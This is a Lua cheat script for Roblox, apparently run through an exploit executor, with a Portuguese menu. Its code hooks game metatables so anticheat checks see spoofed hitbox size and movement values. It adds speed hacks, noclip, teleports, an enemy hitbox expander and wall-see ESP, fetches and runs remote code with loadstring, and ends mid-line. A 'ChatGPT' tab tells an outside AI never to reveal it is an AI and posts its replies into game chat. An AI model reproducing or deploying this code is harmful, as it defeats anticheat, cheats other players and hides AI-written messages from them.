local n = getrawmetatable(game)
setreadonly(n, false)
local o = n.__index

n.__index = newcclosure(function(p, q)
    if q == "Size" then
        local ok, cls = pcall(function() return p.ClassName end)
        if ok and cls == "Part" and p.Name == "HumanoidRootPart" then
            return Vector3.new(2, 2, 1)
        end
    end
    return o(p, q)
end)

setreadonly(n, true)

local function bypass(h)
    local ok, mt = pcall(getrawmetatable, h)
    if not ok or not mt then return end

    setreadonly(mt, false)

    local old = mt.__index
    mt.__index = newcclosure(function(s, k)
        if s == h then
            if k == "WalkSpeed" then return 16 end
            if k == "JumpPower" then return 50 end
        end
        return old(s, k)
    end)

    setreadonly(mt, true)
end

-- serviços e variaveis
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local Replicated = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local TextChatService = game:GetService("TextChatService")
local TeleportService = game:GetService("TeleportService")

local Player = Players.LocalPlayer
local player = Players.LocalPlayer
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

-- mapas

local TEVEZ_MAPA = game.PlaceId == 13132367906
local APEX_MAPA = game.PlaceId == 2069320852
local DELTA_MAPA = game.PlaceId == 14511049

if APEX_MAPA then
Player:Kick("Jogo não permitido. Esse kick foi feito para que você não seja banido.")
end


-- Loader
local WindUI
do
    local ok, result = pcall(function()
        return require("./src/Init")
    end)

    if ok then
        WindUI = result
    else
        WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
    end
end

local Window = WindUI:CreateWindow({
    Title = "michigun.xyz",
    Folder = "fp3",
    IconSize = 22*2,
    Size = UDim2.fromOffset(400, 300),
    Transparent = true,
    NewElements = true,
    Resizable = true,
    Folder = "michigun.xyz",
    HideSearchBar = false, 
	Background = "rbxassetid://84620540532972",
    Topbar = {
        Height = 30,
        ButtonsType = "Mac",
    },
})

local SecretWord = "/e" 
local ChatConnection = nil

local function setupChatToggle()
    if ChatConnection then
        ChatConnection:Disconnect()
        ChatConnection = nil
    end

    ChatConnection = player.Chatted:Connect(function(msg)
        if msg == SecretWord then
            Window:Toggle()
        end
    end)
end

setupChatToggle()

Window:Tag({
    Title = "sanctuaryangels",
    Icon = "geist:logo-gitlab",
    Color = Color3.fromHex("#1c1c1c")
})

Window:Tag({
    Title = "fp3",
    Icon = "geist:logo-discord",
    Color = Color3.fromHex("#1c1c1c")
})

local Purple = Color3.fromHex("#7775F2")
local Yellow = Color3.fromHex("#ECA201")
local Green = Color3.fromHex("#10C550")
local Grey = Color3.fromHex("#83889E")
local Blue = Color3.fromHex("#257AF7")
local Red = Color3.fromHex("#EF4F1D")

-- atualizações 
do
    local AboutTab = Window:Tab({
        Title = "Atualizações",
        Desc = "Informações",
        Icon = "lucide:bell",
        IconColor = Yellow
    })

    AboutTab:Image({
        Image = "https://cdn.discordapp.com/attachments/1460824919758868501/1460825713694474459/avatar.png?ex=69685376&is=696701f6&hm=c51ba032a92649e7cf903e63048f23c8d6270f4615722719e29ba1e536564bc5&",
        AspectRatio = "4:3",
        Radius = 9,
    })

    AboutTab:Space({ Columns = 3 })

    AboutTab:Section({
        Title = "Changelogs:",
        TextSize = 30,
        FontWeight = Enum.FontWeight.SemiBold,
    })

    AboutTab:Space()

    AboutTab:Section({
        Title = [[
- Adicionado: Avatar changer (permite mudar seu avatar localmente)
- Hitbox pode ter o formato alterado
- Otimizações e misc fixes no geral

Desenvolvido e mantido por @fp3, em LuaU. Isso é apenas um hobby.]],
        TextSize = 18,
        TextTransparency = .35,
        FontWeight = Enum.FontWeight.Medium,
    })

    AboutTab:Space({ Columns = 4 })
end

-- sections

local ElementsSection = Window:Section({
    Title = "Local",
    Icon = "lucide:list"
})

local CombateSection = Window:Section({
    Title = "Combate",
    Icon = "lucide:crosshair"
})

local AutoSection = Window:Section({
    Title = "Auto",
    Icon = "geist:robot"
})

local ParkourSection = Window:Section({
    Title = "Parkour",
    Icon = "geist:buildings"
})



local function Notify(title, content, dur)
    pcall(function()
        WindUI:Notify({
            Title = tostring(title or ""),
            Content = tostring(content or ""),
            Duration = dur or 3,
            Icon = "bird"
        })
    end)
end

local function notif(t, d) Notify(t, d) end
local function notif_af(t, d) Notify(t, d) end

local WalkSpeedDefault = 16
local NoClipConn = nil
local CanCollide = true

if Player.Character then
    local hum = Player.Character:FindFirstChildOfClass("Humanoid")
    if hum then bypass(hum) end
end
Player.CharacterAdded:Connect(function(c)
    local h = c:WaitForChild("Humanoid")
    bypass(h)
end)

-- Noclip

local function NoClip()
    if not CanCollide and Player.Character then
        for _, v in pairs(Player.Character:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide then
                v.CanCollide = false
            end
        end
    end
end


-- =========================
-- 8) TAB - Mods (UI)
-- =========================

do
    local TabA = ElementsSection:Tab({
        Title = "Player",
        Icon = "lucide:user",
        IconColor = Blue
    })

local humanoidsection = TabA:Section({ 
    Title = "Humanoid"
})
    local speedValue = nil

    humanoidsection:Paragraph({
        Title = "Speed",
        Desc = "Modifica a velocidade do personagem. Burla a maioria dos anticheats.",
    })

    humanoidsection:Input({
        Title = "Speed",
        Placeholder = "Valor",
        Callback = function(v)
if v == "" then return end
            local n = tonumber(v)
            speedValue = n
            if n then
                Notify("Speed", "Valor: "..tostring(n))
            else
                Notify("Speed", "Inválido")
            end
        end
    })
    humanoidsection:Space()

local grupamento1 = humanoidsection:Group()

    grupamento1:Button({
        Title = "Aplicar velocidade",
        Callback = function()
            if not speedValue then
                Notify("Speed", "Informe um valor válido.")
                return
            end

            local h = Player.Character and Player.Character:FindFirstChild("Humanoid")
            if h then
                h.WalkSpeed = speedValue
                Notify("Speed", "Alterada para "..tostring(speedValue))
            else
                Notify("Speed", "Personagem não encontrado.")
            end
        end
    })
    grupamento1:Space()

    grupamento1:Button({
        Title = "Resetar speed",
        Callback = function()
            local h = Player.Character and Player.Character:FindFirstChild("Humanoid")
            if h then
                h.WalkSpeed = WalkSpeedDefault or 16
                Notify("Speed", "Restaurada")
            end
        end
    })
humanoidsection:Space()

local Antispawn = false
local DeathCFrame = nil

local function onCharacterDied()
	local character = player.Character
    
    if not Antispawn then
        DeathCFrame = nil
        return
    end
    
	if character and character:FindFirstChild("HumanoidRootPart") then
		DeathCFrame = character.HumanoidRootPart.CFrame
	end
end

local function onCharacterAdded(character)
	local humanoid = character:WaitForChild("Humanoid")
	
	humanoid.Died:Connect(onCharacterDied)

	if Antispawn and DeathCFrame then
		local hrp = character:WaitForChild("HumanoidRootPart")
        
        task.wait(0.05)
        
		hrp.CFrame = DeathCFrame
	end
end

player.CharacterAdded:Connect(onCharacterAdded)
if player.Character then
	onCharacterAdded(player.Character)
end

humanoidsection:Toggle({
    Title = "Anti-spawn",
    Desc = "O personagem automaticamente teleportará ao local onde você morreu.",
    Callback = function(v)
        Antispawn = v
        if not v then
            DeathCFrame = nil
        end
    end
})
humanoidsection:Space()

humanoidsection:Paragraph({
        Title = "Noclip",
        Desc = "Permite atravessar paredes.",
    })

    humanoidsection:Toggle({
        Title = "Noclip",
        Callback = function(state)
            if state then
                CanCollide = false
                if NoClipConn then
                    pcall(function() NoClipConn:Disconnect() end)
                end
                NoClipConn = RunService.Stepped:Connect(NoClip)
                Notify("Noclip", "[NOCLIP] Ativado")
            else
                CanCollide = true
                if NoClipConn then
                    pcall(function() NoClipConn:Disconnect() end)
                    NoClipConn = nil
                end
                Notify("Noclip", "[NOCLIP] Desativado")
            end
        end
    })

local playersection = TabA:Section({ 
    Title = "Players"
})

playersection:Toggle({
    Title = "Habilitar chat",
    Desc = "Permite você ver o histórico de mensagens no chat.",
    Callback = function(v)
    TextChatService.ChatWindowConfiguration.Enabled = v
    end
})
playersection:Space()

local SelectedViewPlayer
local SelectedTPPlayer
local Viewing = false
local ViewConn
local Teleporting = false
local LastCFrame

local LastViewResult
local LastTPResult
local SettingInput = false

local function getHRP(player)
    local char = player and player.Character
    return char
end

local function findPlayerSmart(text)
    if not text or text == "" then return nil end
    text = text:lower()

    local startsWith
    local contains

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local name = plr.Name:lower()
            if name:sub(1, #text) == text then
                startsWith = plr
                break
            elseif not contains and name:find(text, 1, true) then
                contains = plr
            end
        end
    end

    return startsWith or contains
end

local function stopViewing()
    Viewing = false
    if ViewConn then
        ViewConn:Disconnect()
        ViewConn = nil
    end

    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if hum then
        Camera.CameraSubject = hum
    end
end

local ViewInput
ViewInput = playersection:Input({
    Title = "View",
    Desc = "Digite o nome do jogador",
    Placeholder = "Nome",
    Callback = function(text)
        if SettingInput then return end

        local plr = findPlayerSmart(text)
        SelectedViewPlayer = plr

        if plr and text:lower() ~= plr.Name:lower() then
            SettingInput = true
            ViewInput:Set(plr.Name)
            SettingInput = false
        end

        if plr ~= LastViewResult then
            LastViewResult = plr
            if plr then
                Notify("Input", "Encontrado: " .. plr.Name)
            elseif text ~= "" then
                Notify("Input", "Nenhum jogador encontrado")
            end
        end
    end
})

playersection:Toggle({
    Title = "View jogador",
    Desc = "Habilita ou desativa o view no jogador especificado.",
    Callback = function(v)
        Viewing = v

        if not v then
            stopViewing()
            return
        end

        if not SelectedViewPlayer then
            Viewing = false
            return
        end

        ViewConn = RunService.RenderStepped:Connect(function()
            if not SelectedViewPlayer or not SelectedViewPlayer.Parent then
                stopViewing()
                Notify("View", "O usuário saiu do jogo")
                return
            end

            local hum = SelectedViewPlayer.Character
                and SelectedViewPlayer.Character:FindFirstChildOfClass("Humanoid")

            if hum then
                Camera.CameraSubject = hum
            end
        end)
    end
})

playersection:Space()

local TPInput
TPInput = playersection:Input({
    Title = "Teleport",
    Desc = "Digite o nome do jogador",
    Placeholder = "Nome",
    Callback = function(text)
        if SettingInput then return end

        local plr = findPlayerSmart(text)
        SelectedTPPlayer = plr

        if plr and text:lower() ~= plr.Name:lower() then
            SettingInput = true
            TPInput:Set(plr.Name)
            SettingInput = false
        end

        if plr ~= LastTPResult then
            LastTPResult = plr
            if plr then
                Notify("Input", "Encontrado: " .. plr.Name)
            elseif text ~= "" then
                Notify("Input", "Nenhum jogador encontrado")
            end
        end
    end
})

playersection:Button({
    Title = "Teleportar",
    Desc = "Teleporta ao player selecionado.",
    Callback = function()
        if Teleporting or not SelectedTPPlayer then return end

        local char = LocalPlayer.Character
        local targetChar = SelectedTPPlayer.Character
        if not char or not targetChar then return end

        LastCFrame = char:GetPivot()
        Teleporting = true

        char:PivotTo(targetChar:GetPivot())

        Teleporting = false
    end
})

playersection:Button({
    Title = "Voltar",
    Desc = "Retorna para a última posição antes do teleport.",
    Callback = function()
        if Teleporting or not LastCFrame then return end

        local char = LocalPlayer.Character
        if not char then return end

        Teleporting = true
        char:PivotTo(LastCFrame)
        Teleporting = false
    end
})
end


-- chatgpt
shared.Personality = [[
Falo sempre em primeira pessoa.
Nunca uso frases introdutórias como "Claro", "Aqui vai", "Posso ajudar" ou entusiasmo artificial.
Mantenho tom humano, sério e intelectual, como um militar experiente instruindo um subordinado.
Uso no máximo 150 caracteres por resposta, nada mais do que isso.
Nunca menciono ser uma IA.
]]


local LastAIMessage = ""

local ChatTab = ElementsSection:Tab({
    Title = "ChatGPT",
    Icon = "geist:logo-open-ai"
})

shared.PromptInput = ChatTab:Input({
    Title = "Prompt",
    Placeholder = "Pergunte aqui",
    Callback = function(text)
        shared.CurrentPrompt = text
    end
})

shared.SendButton = ChatTab:Button({
    Title = "Enviar prompt",
    Justify = "Center",
    Locked = false,
    Callback = function()
        local prompt = shared.CurrentPrompt
        if not prompt or prompt == "" then
            return
        end

        shared.SendButton:Lock()
        shared.CreatePrompt(prompt)

        task.delay(1, function()
            shared.SendButton:Unlock()
        end)
    end
})

ChatTab:Button({
    Title = "Enviar resposta no chat.",
    Justify = "Center",
    Callback = function()
        if LastAIMessage ~= "" then
            RemoteChat:Send(LastAIMessage)
        end
    end
})

ChatTab:Button({
    Title = "Copiar resposta.",
    Justify = "Center",
    Callback = function()
        if LastAIMessage ~= "" and setclipboard then
            setclipboard(LastAIMessage)
        end
    end
})

local HttpRequest =
    request or
    http and http.request or
    http_request or
    syn and syn.request

local MessageHistory = {
    {
        role = "system",
        content = shared.Personality
    }
}

local function extractLuaCode(responseText)
    local luaCode = responseText:match("```lua(.-)```")
    if luaCode then
        local cleanText = responseText:gsub("```lua.-```", "")
        return luaCode, cleanText
    end
    return nil, responseText
end

local function createAIParagraph(title, description)
    return ChatTab:Paragraph({
        Title = title,
        Desc = description,
        Color = "Green",
        Image = "rbxassetid://125966901198850",
        ImageSize = 28
    })
end

function shared.CreatePrompt(promptText)
    ChatTab:Divider()
    ChatTab:Space()

    local timestamp = os.date("%H:%M:%S")

    table.insert(MessageHistory, {
        role = "user",
        content = promptText
    })

    ChatTab:Paragraph({
        Title = timestamp .. " Você:",
        Color = "Blue",
        Desc = promptText,
        Image = "user",
        ImageSize = 25
    })

    local response = HttpRequest({
        Url = "https://text.pollinations.ai/openai",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            messages = MessageHistory
        })
    })

    local decodedResponse = HttpService:JSONDecode(response.Body)
    local aiText = decodedResponse.choices[1].message.content or ""

    local luaCode, cleanMessage = extractLuaCode(aiText)

    LastAIMessage = cleanMessage

    createAIParagraph(timestamp .. " Resposta:", cleanMessage)

    table.insert(MessageHistory, {
        role = "assistant",
        content = cleanMessage
    })

    if luaCode then
        ChatTab:Code({
            Code = luaCode
        })
    end
end

-- avatar

local svc = setmetatable({}, {__index = function(s, n)
    s[n] = game:GetService(n)
    return s[n]
end})

local lp = svc.Players.LocalPlayer
local targetInput = ""
local currentAppliedId = lp.UserId
local selectedFavorite = nil
local confirmDelete = false
local confirmTask = nil

if not isfolder("fp3_Skins") then
    makefolder("fp3_Skins")
end

local function getSavedSkinsList()
    local files = listfiles("fp3_Skins")
    local options = {}
    for _, file in ipairs(files) do
        local name = file:match("([^\\/]+)%.txt$")
        if name then
            table.insert(options, {Title = name, Icon = "lucide:user"})
        end
    end
    if #options == 0 then
        table.insert(options, {Title = "Nenhuma salva", Icon = "lucide:frown"})
    end
    return options
end

local function morphchar(char, faken, fakeid, desc)
    currentAppliedId = fakeid
    task.spawn(function()
        xpcall(function()
            task.wait(0.3)
            local hum = char:WaitForChild("Humanoid", 10)
            if not hum then return end
            for _, v in char:GetDescendants() do
                if v:IsA("Accessory") or v:IsA("Hat") then v:Destroy() end
            end
            for _, v in char:GetChildren() do
                if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("ShirtGraphic") or v:IsA("CharacterMesh") then v:Destroy() end
            end
            local bc = hum:FindFirstChildOfClass("BodyColors")
            if bc then bc:Destroy() end
            for _, n in {"Torso","Left Arm","Right Arm","Left Leg","Right Leg"} do
                local pt = char:FindFirstChild(n)
                if pt then
                    for _, v in pt:GetChildren() do
                        if v:IsA("SpecialMesh") then v:Destroy() end
                    end
                end
            end
            local hd = char:FindFirstChild("Head")
            if hd then
                local ms = hd:FindFirstChildOfClass("SpecialMesh")
                if ms then
                    ms.MeshId = ""
                    ms.TextureId = ""
                end
            end
            task.wait(0.1)
            hum:ApplyDescriptionClientServer(desc)
        end, warn)
    end)
end

local avatarchanger = ElementsSection:Tab({
    Title = "Avatar",
    Icon = "lucide:user-round-pen",
    Color = Color3.fromHex("#F0FFFF")
})

avatarchanger:Paragraph({
    Title = "Observação",
    Desc = "A skin aplicada é VISUAL. Ou seja, NÃO mostra aos outros jogadores, somente a você.",
    Color = "Blue",
    Image = "lucide:octagon-alert",
    ImageSize = 30,
    Locked = false
})

avatarchanger:Space()

avatarchanger:Input({
    Title = "Nome / ID",
    Desc = "Digite o nome ou ID do usuário para copiar a skin.",
    Value = "",
    InputIcon = "lucide:search-check",
    Placeholder = "Digite aqui",
    Callback = function(input)
        targetInput = input
    end
})

avatarchanger:Button({
    Title = "Aplicar",
    Desc = "Aplica a skin do nome ou ID colocado",
    Callback = function()
        local fakename = targetInput
        if fakename == "" then return end
        local fakeid = tonumber(fakename)
        local ok = pcall(function()
            if fakeid then
                fakename = svc.Players:GetNameFromUserIdAsync(fakeid)
            else
                fakeid = svc.Players:GetUserIdFromNameAsync(fakename)
                fakename = svc.Players:GetNameFromUserIdAsync(fakeid)
            end
        end)
        if ok and lp.Character then
            local desc = svc.Players:GetHumanoidDescriptionFromUserId(fakeid)
            morphchar(lp.Character, fakename, fakeid, desc)
        end
    end
})

avatarchanger:Button({
    Title = "Restaurar",
    Desc = "Restaura sua skin padrão",
    Callback = function()
        local desc = svc.Players:GetHumanoidDescriptionFromUserId(lp.UserId)
        if lp.Character then
            morphchar(lp.Character, lp.Name, lp.UserId, desc)
        end
    end
})

avatarchanger:Space()

avatarchanger:Paragraph({
    Title = "Observação",
    Desc = "As skins são salvas na pasta 'fp3_Skins' no Workspace do seu executor.",
    Color = "Blue",
    Image = "lucide:octagon-alert",
    ImageSize = 30,
    Locked = false
})

local DeleteButton

local SkinDropdown = avatarchanger:Dropdown({
    Title = "Favoritos",
    Desc = "Aqui serão listados seus ID's favoritos",
    Values = getSavedSkinsList(),
    Value = "",
    Callback = function(option)
        confirmDelete = false
        if confirmTask then task.cancel(confirmTask) confirmTask = nil end
        DeleteButton:SetTitle("Deletar favorito")
        DeleteButton:SetDesc("Remove a skin favoritada selecionada")
        DeleteButton.Icon = "lucide:trash-2"
        DeleteButton.Color = Color3.fromHex("#FF5555")
        if option.Title == "Nenhuma salva" then
            selectedFavorite = nil
            return
        end
        selectedFavorite = option.Title
        local success, savedId = pcall(function()
            return readfile("fp3_Skins/" .. option.Title .. ".txt")
        end)
        if success then
            local s, desc = pcall(function()
                return svc.Players:GetHumanoidDescriptionFromUserId(tonumber(savedId))
            end)
            if s and lp.Character then
                morphchar(lp.Character, option.Title, tonumber(savedId), desc)
            end
        end
    end
})

avatarchanger:Button({
    Title = "Favoritar",
    Desc = "Salva o ID do usuário da skin aplicada atual",
    Color = Color3.fromHex("#FFD700"),
    Callback = function()
        local fileName = (targetInput ~= "" and targetInput:gsub("[^%w%s]", "")) or "Skin_" .. currentAppliedId
        writefile("fp3_Skins/" .. fileName .. ".txt", tostring(currentAppliedId))
        SkinDropdown:Refresh(getSavedSkinsList())
    end
})

DeleteButton = avatarchanger:Button({
    Title = "Deletar favorito",
    Desc = "Remove a skin favoritada selecionada",
    Icon = "lucide:trash-2",
    Color = Color3.fromHex("#FF5555"),
    Callback = function()
        if not selectedFavorite then return end
        if not confirmDelete then
            confirmDelete = true
            DeleteButton:SetTitle("Confirmar exclusão?")
            DeleteButton:SetDesc("Você tem 3 segundos para confirmar")
            DeleteButton.Icon = "lucide:triangle-alert"
            DeleteButton.Color = Color3.fromHex("#FF0000")
            confirmTask = task.delay(3, function()
                confirmDelete = false
                DeleteButton:SetTitle("Deletar favorito")
                DeleteButton:SetDesc("Remove a skin favoritada selecionada")
                DeleteButton.Icon = "lucide:trash-2"
                DeleteButton.Color = Color3.fromHex("#FF5555")
            end)
            return
        end
        if confirmTask then task.cancel(confirmTask) confirmTask = nil end
        local path = "fp3_Skins/" .. selectedFavorite .. ".txt"
        if isfile(path) then
            delfile(path)
        end
        confirmDelete = false
        selectedFavorite = nil
        DeleteButton:SetTitle("Deletar favorito")
        DeleteButton:SetDesc("Remove a skin favoritada selecionada")
        DeleteButton.Icon = "lucide:trash-2"
        DeleteButton.Color = Color3.fromHex("#FF5555")
        SkinDropdown:Refresh(getSavedSkinsList())
    end
})


-- hitbox esp

do
    local TabB = CombateSection:Tab({
        Title = "Combate",
        Icon = "lucide:heart-minus",
        IconColor = Color3.fromRGB(0, 255, 0)
    })

    local SectionHitbox = TabB:Section({
        Title = "Hitbox expander"
    })

    local ESPEnabled = false

    local ESPSettings = {
        Box = false,
        Name = false,
        Studs = false,
        Health = false,
        WeaponN = false
    }

    local ESP = {}
    local OriginalHRP = {}

    local function ESP_New(Player)
        if Player == LocalPlayer then return end

        local E = {}

        E.Box = Drawing.new("Square")
        E.Box.Thickness = 2
        E.Box.Filled = false
        E.Box.Color = Color3.fromRGB(255, 255, 255)
        E.Box.Visible = false

        local function newText()
            local t = Drawing.new("Text")
            t.Size = 13
            t.Color = Color3.fromRGB(255, 255, 255)
            t.Center = true
            t.Outline = true
            t.Font = 3
            t.Visible = false
            return t
        end

        E.Name = newText()
        E.Health = newText()
        E.Studs = newText()
        E.WeaponN = newText()

        ESP[Player] = E
    end

    local function ESP_Remove(Player)
        if ESP[Player] then
            for _, v in pairs(ESP[Player]) do
                pcall(function() v:Remove() end)
            end
            ESP[Player] = nil
        end
    end

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            ESP_New(plr)
        end
    end

    Players.PlayerAdded:Connect(function(plr)
        ESP_New(plr)
    end)

    Players.PlayerRemoving:Connect(function(plr)
        ESP_Remove(plr)
        OriginalHRP[plr] = nil
    end)

    RunService.RenderStepped:Connect(function()
        if not ESPEnabled then
            for _, E in pairs(ESP) do
                for _, v in pairs(E) do
                    v.Visible = false
                end
            end
            return
        end

        local cam = workspace.CurrentCamera

        for Player, E in pairs(ESP) do
            local char = Player.Character
            local hum = char and char:FindFirstChild("Humanoid")
            local hrp = char and char:FindFirstChild("HumanoidRootPart")

            if not hum or hum.Health <= 0 or not hrp then
                for _, v in pairs(E) do v.Visible = false end
                continue
            end

            local cf, size = char:GetBoundingBox()
            local min = cf.Position - size / 2
            local max = cf.Position + size / 2

            local corners = {
                Vector3.new(min.X,min.Y,min.Z), Vector3.new(min.X,min.Y,max.Z),
                Vector3.new(min.X,max.Y,min.Z), Vector3.new(min.X,max.Y,max.Z),
                Vector3.new(max.X,min.Y,min.Z), Vector3.new(max.X,min.Y,max.Z),
                Vector3.new(max.X,max.Y,min.Z), Vector3.new(max.X,max.Y,max.Z),
            }

            local screen = {}
            local valid = true

            for _, pt in ipairs(corners) do
                local s, vis = cam:WorldToViewportPoint(pt)
                if not vis then valid = false break end
                screen[#screen+1] = Vector2.new(s.X, s.Y)
            end

            if not valid then
                for _, v in pairs(E) do v.Visible = false end
                continue
            end

            local minX, maxX = math.huge, -math.huge
            local minY, maxY = math.huge, -math.huge

            for _, s in ipairs(screen) do
                minX = math.min(minX, s.X)
                maxX = math.max(maxX, s.X)
                minY = math.min(minY, s.Y)
                maxY = math.max(maxY, s.Y)
            end

            if ESPSettings.Box then
                E.Box.Position = Vector2.new(minX, minY)
                E.Box.Size = Vector2.new(maxX - minX, maxY - minY)
                E.Box.Visible = true
            else
                E.Box.Visible = false
            end

            if ESPSettings.Name then
                E.Name.Text = Player.Name
                E.Name.Position = Vector2.new((minX + maxX) / 2, minY - 16)
                E.Name.Visible = true
            else
                E.Name.Visible = false
            end

            if ESPSettings.Health then
                E.Health.Text = "HP: " .. math.floor(hum.Health)
                E.Health.Position = Vector2.new((minX + maxX) / 2, minY - 32)
                E.Health.Visible = true
            else
                E.Health.Visible = false
            end

            if ESPSettings.Studs and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local dist = (LocalPlayer.Character.HumanoidRootPart.Position - hrp.Position).Magnitude
                E.Studs.Text = "[" .. math.floor(dist) .. "m]"
                E.Studs.Position = Vector2.new((minX + maxX) / 2, maxY + 5)
                E.Studs.Visible = true
            else
                E.Studs.Visible = false
            end

            if ESPSettings.WeaponN then
                local tool = char:FindFirstChildOfClass("Tool")
                if tool then
                    E.WeaponN.Text = tool.Name
                    E.WeaponN.Position = Vector2.new((minX + maxX) / 2, maxY + 20)
                    E.WeaponN.Visible = true
                else
                    E.WeaponN.Visible = false
                end
            else
                E.WeaponN.Visible = false
            end
        end
    end)

    local HitboxEnabled = false
    local HitboxSize = Vector3.new(5,5,5)
    local HitboxTransparency = 0.5
    local HitboxShape = Enum.PartType.Ball

    local function SaveOriginal(plr, hrp)
        if not OriginalHRP[plr] then
            OriginalHRP[plr] = {
                Shape = hrp.Shape,
                Size = hrp.Size,
                Transparency = hrp.Transparency,
                CanCollide = hrp.CanCollide,
                Material = hrp.Material
            }
        end
    end

    local function ResetHitbox(plr)
        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local data = OriginalHRP[plr]
        if hrp and data then
            hrp.Shape = data.Shape
            hrp.Size = data.Size
            hrp.Transparency = data.Transparency
            hrp.CanCollide = data.CanCollide
            hrp.Material = data.Material
        end
        if char then
            local hl = char:FindFirstChild("a")
            if hl then hl:Destroy() end
        end
    end

    local function ApplyHitbox(plr)
        if not HitboxEnabled or plr == LocalPlayer or (plr.Team == LocalPlayer.Team and plr.Team ~= nil) then
            ResetHitbox(plr)
            return
        end

        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        SaveOriginal(plr, hrp)

        hrp.Shape = HitboxShape
        hrp.Size = HitboxSize
        hrp.Transparency = HitboxTransparency
        hrp.CanCollide = false
        hrp.Material = Enum.Material.ForceField

        local old = char:FindFirstChild("a")
        if old then old:Destroy() end

        local hl = Instance.new("Highlight")
        hl.Name = "a"
        hl.Parent = char
        hl.Adornee = char
        hl.FillColor = plr.TeamColor.Color
        hl.OutlineColor = Color3.new(1,1,1)
        hl.FillTransparency = 1 - HitboxTransparency
        hl.OutlineTransparency = HitboxTransparency
    end

    local function RefreshAll()
        for _, plr in ipairs(Players:GetPlayers()) do
            if HitboxEnabled then
                ApplyHitbox(plr)
            else
                ResetHitbox(plr)
            end
        end
    end

    local function MonitorCharacter(plr)
        plr.CharacterAdded:Connect(function()
            task.wait(0.2)
            if HitboxEnabled then
                ApplyHitbox(plr)
            else
                ResetHitbox(plr)
            end
        end)
    end

    for _, plr in ipairs(Players:GetPlayers()) do
        MonitorCharacter(plr)
        if plr.Character then
            if HitboxEnabled then
                ApplyHitbox(plr)
            else
                ResetHitbox(plr)
            end
        end
    end

    Players.PlayerAdded:Connect(MonitorCharacter)

    SectionHitbox:Paragraph({
        Title = "Modificar hitbox",
        Desc = "Altera o tamanho e visual da hitbox dos inimigos."
    })

    SectionHitbox:Toggle({
        Title = "Hitbox",
        Callback = function(v)
            HitboxEnabled = v
            RefreshAll()
        end
    })

    SectionHitbox:Dropdown({
        Title = "Formato",
        Desc = "Formato usado para a hitbox.",
        Values = { "Sphere", "Block", "Cylinder", "Wedge" },
        Value = "Sphere",
        Callback = function(option)
            if option == "Sphere" then
                HitboxShape = Enum.PartType.Ball
            elseif option == "Block" then
                HitboxShape = Enum.PartType.Block
            elseif option == "Cylinder" then
                HitboxShape = Enum.PartType.Cylinder
            elseif option == "Wedge" then
                HitboxShape = Enum.PartType.Wedge
            end
            if HitboxEnabled then RefreshAll() end
        end
    })

    SectionHitbox:Input({
        Title = "Tamanho da hitbox",
        Desc = "Valor usado para mudar a hitbox dos inimigos.",
        Placeholder = "Ex: 10",
        Callback = function(v)
            local n = tonumber(v)
            if n then
                HitboxSize = Vector3.new(n,n,n)
                if HitboxEnabled then RefreshAll() end
            end
        end
    })

    SectionHitbox:Space()

    SectionHitbox:Paragraph({
        Title = "Transparência",
        Desc = "Determina o quão visível a bola ficará."
    })

    SectionHitbox:Slider({
        Title = "Transparência",
        Step = 0.02,
        Value = { Min = 0, Max = 1, Default = 0.5 },
        Callback = function(val)
            HitboxTransparency = val
            if HitboxEnabled then RefreshAll() end
        end
    })

    local SectionESP = TabB:Section({
        Title = "ESP"
    })

    SectionESP:Paragraph({
        Title = "ESP",
        Desc = "Permite ver players pela parede."
    })

    SectionESP:Toggle({
        Title = "Ativar",
        Callback = function(v)
            ESPEnabled = v
        end
    })

    SectionESP:Space()

    SectionESP:Paragraph({
        Title = "Opções",
        Desc = "Ative o que você deseja ver!"
    })

    SectionESP:Toggle({ Title = "Box", Callback = function(v) ESPSettings.Box = v end })
    SectionESP:Toggle({ Title = "Nome", Callback = function(v) ESPSettings.Name = v end })
    SectionESP:Toggle({ Title = "Distância", Callback = function(v) ESPSettings.Studs = v end })
    SectionESP:Toggle({ Title = "Vida", Callback = function(v) ESPSettings.Health = v end })
    SectionESP:Toggle({ Title = "Item", Callback = function(v) ESPSettings.WeaponN = v end })
end


-- Auto JJ's

local RemoteChat = {}
local Connections = {}

local WC = game.WaitForChild
local FFC = game.FindFirstChild

local TextChatService = game:GetService("TextChatService")

local PlayerGui = Player:WaitForChild("PlayerGui", 95)

local CurrentChannel
local InputBar = TextChatService:FindFirstChildOfClass("ChatInputBarConfiguration")

local Methods = {
    [Enum.ChatVersion.LegacyChatService] = function(Message)
        local ChatUI = PlayerGui:FindFirstChild("Chat")
        
        if CurrentChannel then
            CurrentChannel:SendAsync(Message)
        elseif ChatUI then
            local ChatFrame = WC(ChatUI, "Frame", 95)
            local CBPF = WC(ChatFrame, "ChatBarParentFrame", 95)

            local Frame = WC(CBPF, "Frame", 95)
            local BF = WC(Frame, "BoxFrame", 95)

            local ChatFM = WC(BF, "Frame", 95)
            local ChatBar = FFC(ChatFM, "ChatBar", 95)

            ChatBar:CaptureFocus()
            ChatBar.Text = Message
            ChatBar:ReleaseFocus(true)
        end
    end,

    [Enum.ChatVersion.TextChatService] = function(Message)
        if CurrentChannel then
            CurrentChannel:SendAsync(Message)
        end
    end,
}

function RemoteChat:Send(Message)
    pcall(Methods[TextChatService.ChatVersion], Message)
end

if InputBar then
    table.insert(Connections, InputBar.Changed:Connect(function(Prop)
        if Prop == "TargetTextChannel" and InputBar.TargetTextChannel 
